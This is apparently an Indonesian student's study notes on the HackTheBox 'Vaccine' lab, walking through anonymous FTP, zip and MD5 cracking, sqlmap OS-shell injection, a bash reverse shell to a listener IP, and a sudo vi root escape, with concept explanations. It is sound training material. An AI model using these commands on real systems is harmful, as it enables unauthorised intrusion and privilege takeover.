```
=== HTB Machine: Vaccine - Resume Materi ===
[16 Mei 2026]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ALUR ATTACK CHAIN
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Nmap Scan → FTP Anonymous → backup.zip → crack zip
    → baca index.php → crack MD5 → login web admin
    → SQLi → sqlmap os-shell → reverse shell
    → hardcoded creds → sudo -l → vi exploit → ROOT

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 NMAP
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Command  : nmap -sV -sC -T4 <IP>
Switch   :
  -sV    = deteksi versi service
  -sC    = jalanin default NSE scripts
  -T4    = timing agresif (aman di HTB)
  -p-    = scan semua 65535 port (lambat, skip kalau ga perlu)

Hasil Vaccine :
  21/tcp → FTP vsftpd 3.0.3 (Anonymous login allowed!)
  22/tcp → SSH OpenSSH 8.0p1
  80/tcp → HTTP Apache 2.4.41 (MegaCorp Login)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 LINUX FILE PERMISSION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Format   : [type][owner][group][others]
Contoh   : -rwxr-xr-x  1  0  0  2533  backup.zip
            │ │││ │││ │││
            │ │││ │││ └── Others : r=read, -=no write, x=execute
            │ │││ └────── Group  : r=read, -=no write, x=execute
            │ └────────── Owner  : r=read, w=write, x=execute
            └──────────── Tipe   : -=file, d=directory, l=symlink

Kolom angka :
  1   = jumlah hard links
  0   = UID (User ID) → 0 = root
  0   = GID (Group ID) → 0 = root group

r = read   = bisa download/baca
w = write  = bisa upload/edit
x = execute = bisa dieksekusi

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 FTP ANONYMOUS LOGIN
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Bahaya   : siapapun bisa akses tanpa password
Command  :
  ftp <IP>          → konek ke FTP
  Username: anonymous
  Password: (Enter kosong)
  ls                → list isi direktori
  get <filename>    → download file

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 CRACK PASSWORD ZIP (JOHN THE RIPPER)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Alur     :
  zip2john backup.zip > hash.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  unzip backup.zip → masukkan password hasil crack

rockyou.txt = wordlist 14 juta password dari breach rockyou.com

Wordlist attack = cocokkan dari daftar password yang ada
Brute force     = coba semua kombinasi karakter (lambat)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 HASH vs ENKRIPSI
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Hash      = satu arah, TIDAK bisa dibalik (MD5, SHA256)
Enkripsi  = dua arah, BISA di-decrypt kalau punya key (AES, RSA)

Crack MD5 :
  echo "hash" > hashpw.txt
  john --format=RAW-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashpw.txt

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 SQL INJECTION (SQLi)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Apa itu  : inject query SQL ke input web → manipulasi database
Test     : masukkan ' (single quote) → kalau error = VULNERABLE
Bahaya   : akses/manipulasi database, bypass login, RCE

SQLi vs XSS :
  SQLi = inject ke DATABASE (server side)
  XSS  = inject JavaScript ke BROWSER (client side)
         → bisa curi cookie/session korban (Session Hijacking)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 SQLMAP
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Command  :
  sqlmap -u "http://IP/dashboard.php?search=test" \
  --cookie="PHPSESSID=VALUE" \
  --os-shell \
  --dbms=PostgreSQL \
  --level=1 --risk=1

Switch   :
  -u           = target URL
  --cookie     = session cookie (wajib kalau halaman butuh login)
  --os-shell   = dapat shell OS via SQLi
  --dbms       = skip deteksi DB, langsung fokus ke DB tertentu
  --level      = kedalaman testing (1-5)
  --risk       = risiko payload (1-3)

Kenapa butuh cookie?
  Halaman dashboard butuh login → sqlmap perlu PHPSESSID
  PHPSESSID = tanda pengenal sesi login di server

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 REVERSE SHELL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Konsep   : server yang konek BALIK ke kita (bukan kita ke server)
RCE vs Reverse Shell :
  RCE          = vulnerability (bisa jalanin command di server)
  Reverse Shell = teknik memanfaatkan RCE

Listener di Kali :
  nc -lvnp 4444
  Switch : -l=listen, -v=verbose, -n=no DNS, -p=port

Payload di target :
  bash -c 'bash -i >& /dev/tcp/TUN0_IP/4444 0>&1'
  WAJIB pakai IP tun0 (IP VPN HTB) bukan eth0!

  tun0 = interface VPN HTB → target bisa reach
  eth0 = IP lokal VM → target TIDAK bisa reach

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 UPGRADE KE TTY SHELL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Kenapa perlu? Reverse shell = dumb shell, tidak bisa jalanin
              sudo atau program interaktif

Caranya  :
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  Ctrl+Z
  stty raw -echo; fg
  (Enter dua kali)
  export TERM=xterm
  export SHELL=bash

Kalau terminal ngebug : ketik → reset  atau  stty sane

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PRIVILEGE ESCALATION - SUDO
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Cek sudo  : sudo -l
            → lihat command apa yang bisa dijalanin sebagai root
            → (NOPASSWD) = bisa tanpa password = celah besar!

GTFOBins  : gtfobins.github.io
            → daftar binary yang bisa dieksploit untuk privesc
            → contoh: vi, python, perl, find, dll

Exploit vi :
  sudo /bin/vi <file>   → buka vi sebagai root
  :shell                → spawn bash sebagai ROOT!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 HARDCODED CREDENTIALS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Apa itu  : kredensial yang ditulis langsung di source code
Bahaya   : kalau file terbaca attacker → kredensial langsung ketahuan
Lokasi   : file PHP yang konek ke database (dashboard.php, config.php)

Default web path di Linux :
  Apache/Nginx → /var/www/html
  
Cari creds : cat /var/www/html/dashboard.php

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 LOKASI FLAG HTB
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
User flag → /home/USERNAME/user.txt
Root flag → /root/root.txt

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ISTILAH PENTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TTY              = terminal beneran yang support program interaktif
Dumb Shell       = reverse shell basic, belum punya TTY
Session Hijacking= bajak sesi orang lain pakai cookie yang dicuri
Hardcoded Creds  = kredensial yang ditulis langsung di source code
GTFOBins         = binary innocent yang bisa dieksploit untuk privesc
Verbose Error    = error yang menampilkan detail internal sistem
                   (developer lupa matiin di production)
PHPSESSID        = cookie tanda pengenal sesi login PHP
Wordlist Attack  = crack password dengan mencocokkan dari daftar
Brute Force      = crack password dengan coba semua kombinasi
```